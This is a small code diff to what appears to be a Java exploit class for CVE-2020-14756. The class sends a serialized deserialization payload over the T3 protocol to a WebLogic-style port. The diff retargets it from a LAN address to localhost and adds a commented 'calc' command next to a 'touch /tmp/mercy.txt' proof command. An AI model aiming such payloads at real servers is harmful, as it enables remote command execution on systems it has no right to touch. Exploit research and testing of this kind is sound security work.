@@ -64,7 +64,7 @@ public class CVE_2020_14756 implements ObjectPayload<Object>{
 
         try {
             System.out.println(serialized);
-            T3.send("192.168.21.128", "7001", serialized);
+            T3.send("127.0.0.1", "7001", serialized);
 //            final Object objAfter = Deserializer.deserialize(serialized);
         } catch (Exception e) {
             e.printStackTrace();
@@ -74,6 +74,7 @@ public class CVE_2020_14756 implements ObjectPayload<Object>{
 
     public static void main(String[] args) throws Exception {
         run(CVE_2020_14756.class, new String[]{"touch /tmp/mercy.txt"});
+//        run(CVE_2020_14756.class, new String[]{"calc"});
         //"touch /tmp/mercy.txt";
     }
 
